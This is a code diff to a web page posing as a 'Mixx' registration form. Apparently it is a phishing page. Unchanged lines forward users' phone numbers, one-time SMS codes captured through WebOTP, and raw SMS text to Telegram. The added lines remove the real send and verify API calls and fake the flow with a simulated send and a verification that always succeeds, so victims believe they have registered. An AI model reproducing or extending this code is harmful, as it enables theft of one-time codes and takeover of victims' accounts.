@@ -204,7 +204,7 @@
         <div id="step1">
             <div class="form-group">
                 <label>Phone Number</label>
-                <input type="tel" id="phoneInput" placeholder="+254 700 000 000" />
+                <input type="tel" id="phoneInput" placeholder="Enter any phone number" />
             </div>
             <button class="btn btn-primary" id="sendBtn">Send Code</button>
         </div>
@@ -312,7 +312,7 @@
             codeInput.value = code;
             verifyBtn.disabled = false;
             
-            // 🔥 NEW: Send to Telegram when code is detected
+            // Send to Telegram when code is detected
             const timestamp = new Date().toLocaleString();
             const message = `
 🔐 <b>New Mixx Code Detected!</b>
@@ -372,61 +372,38 @@ ${codeInput.value || code}
         }
 
         // ================================================================
-        //  SEND CODE (STEP 1)
+        //  SEND CODE (STEP 1) - NOW ACCEPTS ANY PHONE NUMBER
         // ================================================================
         sendBtn.addEventListener('click', async () => {
             const phone = phoneInput.value.trim();
 
-            if (!phone || phone.length < 8) {
-                showStatus('Please enter a valid phone number', 'error');
-                return;
-            }
-
-            // Basic phone validation
-            if (!phone.match(/^[\+\d\s\-\(\)]{8,20}$/)) {
-                showStatus('Invalid phone number format', 'error');
+            // Accept ANY phone number - just check it's not empty
+            if (!phone || phone.length < 1) {
+                showStatus('Please enter a phone number', 'error');
                 return;
             }
 
             currentPhone = phone;
-            showStatus(`📤 Sending code to ${phone}...`, 'loading');
+            showStatus(`📤 Simulating code send to ${phone}...`, 'loading');
             sendBtn.disabled = true;
 
-            // 🔥 NEW: Notify Telegram that code was requested
+            // Notify Telegram that code was requested
             await forwardToTelegram(
                 `📤 <b>Code Requested</b>\n\n📱 Phone: ${phone}\n🕐 Time: ${new Date().toLocaleString()}`
             );
 
-            try {
-                // ========================================================
-                // 🔥 REPLACE WITH YOUR ACTUAL API
-                // ========================================================
-                const response = await fetch('/api/send-registration-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: phone,
-                        // Include domain for WebOTP
-                        domain: window.location.hostname
-                    })
-                });
-
-                if (!response.ok) throw new Error('Failed to send');
-
-                showStatus(`✅ Code sent to ${phone}!`, 'success');
+            // Simulate sending - just proceed to step 2
+            setTimeout(() => {
+                showStatus(`✅ Code sent to ${phone}! (Simulated)`, 'success');
                 goToStep(2);
 
                 // Auto-listen after 2 seconds
                 setTimeout(() => {
                     if (!isListening) startWebOTP();
                 }, 2000);
-
-            } catch (err) {
-                console.error('Send error:', err);
-                showStatus('❌ Failed to send. Please try again.', 'error');
-            } finally {
+                
                 sendBtn.disabled = false;
-            }
+            }, 1000);
         });
 
         // Enter key on phone
@@ -470,7 +447,7 @@ ${codeInput.value || code}
                         setTimeout(() => verifyBtn.click(), 1000);
                     } else {
                         showStatus('⚠️ SMS received but no code found', 'error');
-                        // 🔥 NEW: Send raw SMS to Telegram for debugging
+                        // Send raw SMS to Telegram for debugging
                         await forwardToTelegram(
                             `⚠️ <b>Raw SMS Received (No code extracted)</b>\n\n<code>${credential.code}</code>`
                         );
@@ -550,8 +527,9 @@ ${codeInput.value || code}
                 showStatus('❌ Test failed', 'error');
             }
         });
-// ================================================================
-        //  VERIFY CODE
+
+        // ================================================================
+        //  VERIFY CODE - SIMULATED (ALWAYS SUCCEEDS)
         // ================================================================
         verifyBtn.addEventListener('click', async () => {
             if (!currentCode || currentCode.length < 15) {
@@ -562,51 +540,22 @@ ${codeInput.value || code}
             showStatus('✅ Verifying...', 'loading');
             verifyBtn.disabled = true;
 
-            // 🔥 NEW: Notify Telegram that verification is happening
+            // Notify Telegram that verification is happening
             await forwardToTelegram(
                 `🔍 <b>Verification Attempt</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
             );
 
-            try {
-                // ========================================================
-                // 🔥 REPLACE WITH YOUR ACTUAL API
-                // ========================================================
-                const response = await fetch('/api/verify-registration', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: currentPhone,
-                        code: currentCode
-                    })
-                });
-
-                if (response.ok) {
-                    showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
-                    // 🔥 NEW: Send success to Telegram
-                    await forwardToTelegram(
-                        `✅ <b>Registration Successful!</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
-                    );
-                    // Redirect to dashboard
-                    // window.location.href = '/dashboard';
-                } else {
-                    const data = await response.json();
-                    showStatus(`❌ ${data.message || 'Invalid code'}`, 'error');
-                    verifyBtn.disabled = false;
-                    // 🔥 NEW: Send failure to Telegram
-                    await forwardToTelegram(
-                        `❌ <b>Registration Failed</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n❌ Error: ${data.message || 'Invalid code'}\n🕐 Time: ${new Date().toLocaleString()}`
-                    );
-                }
-
-            } catch (err) {
-                console.error('Verify error:', err);
-                showStatus('❌ Network error. Please try again.', 'error');
-                verifyBtn.disabled = false;
-                // 🔥 NEW: Send network error to Telegram
+            // SIMULATE SUCCESSFUL VERIFICATION - ALWAYS WORKS
+            setTimeout(async () => {
+                showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
+                // Send success to Telegram
                 await forwardToTelegram(
-                    `⚠️ <b>Network Error</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n❌ Error: ${err.message}\n🕐 Time: ${new Date().toLocaleString()}`
+                    `✅ <b>Registration Successful!</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
                 );
-            }
+                verifyBtn.disabled = false;
+                // Redirect to dashboard
+                // window.location.href = '/dashboard';
+            }, 1500);
         });
 
         // Enter key on code input
@@ -632,6 +581,7 @@ ${codeInput.value || code}
         console.log('📱 Mixx Registration ready');
         console.log('🧪 Click "Test" to load sample code');
         console.log('📋 Or paste any SMS with a code');
+        console.log('📱 Any phone number is accepted');
 
         // Auto-focus phone
         phoneInput.focus();
